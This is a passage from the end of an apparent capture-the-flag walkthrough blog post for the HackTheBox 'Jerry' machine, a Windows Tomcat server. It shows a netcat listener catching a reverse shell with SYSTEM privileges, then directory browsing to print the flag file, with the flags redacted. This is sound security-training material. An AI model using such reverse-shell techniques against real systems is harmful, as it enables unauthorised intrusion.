</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.136.9.
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.136.9:49192.
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 6.3.9600<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> <span class=m>2013</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\a</span>pache-tomcat-7.0.88&gt;
</span></span></code></pre></div><p>Checking our <strong>privileges</strong> with - <em><strong>whoami</strong></em> - reveals something shocking&mldr; We have <strong>system</strong> access which pretty much eliminates any notion for <strong>privilege escalation</strong> or <strong>lateral movement</strong> (in this case).</p><h2 id=post-exploitation><strong>POST-EXPLOITATION</strong><a hidden class=anchor aria-hidden=true href=#post-exploitation>#</a></h2><p>After <strong>goofing around</strong> a bit, we find the <strong>flags</strong> at - <em>C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt</em> - and <strong>grabbing</strong> them, get&rsquo;s us the box.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction - grabbing the flags on $rhost</span>
</span></span><span class=line><span class=cl>C:<span class=se>\a</span>pache-tomcat-7.0.88&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is 0834-6C04
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\a</span>pache-tomcat-7.0.88
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>06/19/2018  04:07 AM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>06/19/2018  04:07 AM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>06/19/2018  04:06 AM    &lt;DIR&gt;          bin
</span></span><span class=line><span class=cl>06/19/2018  06:47 AM    &lt;DIR&gt;          conf
</span></span><span class=line><span class=cl>06/19/2018  04:06 AM    &lt;DIR&gt;          lib
</span></span><span class=line><span class=cl>05/07/2018  02:16 PM            57,896 LICENSE
</span></span><span class=line><span class=cl>05/29/2023  02:56 AM    &lt;DIR&gt;          logs
</span></span><span class=line><span class=cl>05/07/2018  02:16 PM             1,275 NOTICE
</span></span><span class=line><span class=cl>05/07/2018  02:16 PM             9,600 RELEASE-NOTES
</span></span><span class=line><span class=cl>05/07/2018  02:16 PM            17,454 RUNNING.txt
</span></span><span class=line><span class=cl>06/19/2018  04:06 AM    &lt;DIR&gt;          temp
</span></span><span class=line><span class=cl>05/29/2023  04:50 AM    &lt;DIR&gt;          webapps
</span></span><span class=line><span class=cl>06/19/2018  04:34 AM    &lt;DIR&gt;          work
</span></span><span class=line><span class=cl>               <span class=m>4</span> File<span class=o>(</span>s<span class=o>)</span>         86,225 bytes
</span></span><span class=line><span class=cl>               <span class=m>9</span> Dir<span class=o>(</span>s<span class=o>)</span>   2,364,542,976 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\a</span>pache-tomcat-7.0.88&gt;cd ..
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\&gt;</span><span class=nb>pwd</span>
</span></span><span class=line><span class=cl><span class=nb>pwd</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\&gt;</span>dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is 0834-6C04
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>
</span></span><span class=line><span class=cl>06/19/2018  04:07 AM    &lt;DIR&gt;          apache-tomcat-7.0.88
</span></span><span class=line><span class=cl>08/22/2013  06:52 PM    &lt;DIR&gt;          PerfLogs
</span></span><span class=line><span class=cl>06/19/2018  06:42 PM    &lt;DIR&gt;          Program Files
</span></span><span class=line><span class=cl>06/19/2018  06:42 PM    &lt;DIR&gt;          Program Files <span class=o>(</span>x86<span class=o>)</span>
</span></span><span class=line><span class=cl>06/18/2018  11:31 PM    &lt;DIR&gt;          Users
</span></span><span class=line><span class=cl>01/21/2022  09:49 PM    &lt;DIR&gt;          Windows
</span></span><span class=line><span class=cl>               <span class=m>0</span> File<span class=o>(</span>s<span class=o>)</span>              <span class=m>0</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>6</span> Dir<span class=o>(</span>s<span class=o>)</span>   2,364,542,976 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\&gt;</span><span class=nb>cd</span> Users
</span></span><span class=line><span class=cl><span class=nb>cd</span> Users
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is 0834-6C04
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>06/18/2018  11:31 PM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>06/18/2018  11:31 PM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>06/18/2018  11:31 PM    &lt;DIR&gt;          Administrator
</span></span><span class=line><span class=cl>08/22/2013  06:39 PM    &lt;DIR&gt;          Public
</span></span><span class=line><span class=cl>               <span class=m>0</span> File<span class=o>(</span>s<span class=o>)</span>              <span class=m>0</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>4</span> Dir<span class=o>(</span>s<span class=o>)</span>   2,364,542,976 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers&gt;cd Administrator
</span></span><span class=line><span class=cl><span class=nb>cd</span> Administrator
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is 0834-6C04
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>06/18/2018  11:31 PM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>06/18/2018  11:31 PM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>06/19/2018  06:43 AM    &lt;DIR&gt;          Contacts
</span></span><span class=line><span class=cl>06/19/2018  07:09 AM    &lt;DIR&gt;          Desktop
</span></span><span class=line><span class=cl>06/19/2018  06:43 AM    &lt;DIR&gt;          Documents
</span></span><span class=line><span class=cl>01/21/2022  09:23 PM    &lt;DIR&gt;          Downloads
</span></span><span class=line><span class=cl>06/19/2018  06:43 AM    &lt;DIR&gt;          Favorites
</span></span><span class=line><span class=cl>06/19/2018  06:43 AM    &lt;DIR&gt;          Links
</span></span><span class=line><span class=cl>06/19/2018  06:43 AM    &lt;DIR&gt;          Music
</span></span><span class=line><span class=cl>06/19/2018  06:43 AM    &lt;DIR&gt;          Pictures
</span></span><span class=line><span class=cl>06/19/2018  06:43 AM    &lt;DIR&gt;          Saved Games
</span></span><span class=line><span class=cl>06/19/2018  06:43 AM    &lt;DIR&gt;          Searches
</span></span><span class=line><span class=cl>06/19/2018  06:43 AM    &lt;DIR&gt;          Videos
</span></span><span class=line><span class=cl>               <span class=m>0</span> File<span class=o>(</span>s<span class=o>)</span>              <span class=m>0</span> bytes
</span></span><span class=line><span class=cl>              <span class=m>13</span> Dir<span class=o>(</span>s<span class=o>)</span>   2,364,542,976 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator&gt;cd Desktop
</span></span><span class=line><span class=cl><span class=nb>cd</span> Desktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is 0834-6C04
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>06/19/2018  07:09 AM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>06/19/2018  07:09 AM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>06/19/2018  07:09 AM    &lt;DIR&gt;          flags
</span></span><span class=line><span class=cl>               <span class=m>0</span> File<span class=o>(</span>s<span class=o>)</span>              <span class=m>0</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>3</span> Dir<span class=o>(</span>s<span class=o>)</span>   2,364,542,976 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;type flags
</span></span><span class=line><span class=cl><span class=nb>type</span> flags
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;cd flags
</span></span><span class=line><span class=cl><span class=nb>cd</span> flags
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\f</span>lags&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is 0834-6C04
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\f</span>lags
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>06/19/2018  07:09 AM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>06/19/2018  07:09 AM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>06/19/2018  07:11 AM                <span class=m>88</span> <span class=m>2</span> <span class=k>for</span> the price of 1.txt
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>88</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>   2,364,542,976 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\f</span>lags&gt;type <span class=s2>&#34;2 for the price of 1.txt&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>type</span> <span class=s2>&#34;2 for the price of 1.txt&#34;</span>
</span></span><span class=line><span class=cl>user.txt
</span></span><span class=line><span class=cl>&lt;user-flag&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root.txt
</span></span><span class=line><span class=cl>&lt;root-flag&gt;
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\f</span>lags&gt;
</span></span></code></pre></div><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All that&rsquo;s left for us now is to simply <strong>submit</strong> the <strong>flags</strong> and <strong>terminate</strong> the <strong>target</strong> box (if not terminated automatically).</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/jerry/>jerry</a></li><li><a href=https://bluewalle.github.io/tags/windows-target/>windows-target</a></li><li><a href=https://bluewalle.github.io/tags/easy-box/>easy-box</a></li><li><a href=https://bluewalle.github.io/tags/user-own/>user-own</a></li><li><a href=https://bluewalle.github.io/tags/system-own/>system-own</a></li><li><a href=https://bluewalle.github.io/tags/retired/>retired</a></li><li><a href=https://bluewalle.github.io/tags/tomcat/>tomcat</a></li><li><a href=https://bluewalle.github.io/tags/web/>web</a></li><li><a href=https://bluewalle.github.io/tags/vulnerability-assessment/>vulnerability-assessment</a></li><li><a href=https://bluewalle.github.io/tags/common-services/>common-services</a></li><li><a href=https://bluewalle.github.io/tags/security-tools/>security-tools</a></li><li><a href=https://bluewalle.github.io/tags/msfvenom/>msfvenom</a></li><li><a href=https://bluewalle.github.io/tags/java/>java</a></li><li><a href=https://bluewalle.github.io/tags/brute-force-attack/>brute-force-attack</a></li><li><a href=https://bluewalle.github.io/tags/remote-code-execution/>remote-code-execution</a></li><li><a href=https://bluewalle.github.io/tags/arbitrary-file-upload/>arbitrary-file-upload</a></li><li><a href=https://bluewalle.github.io/tags/default-credentials/>default-credentials</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>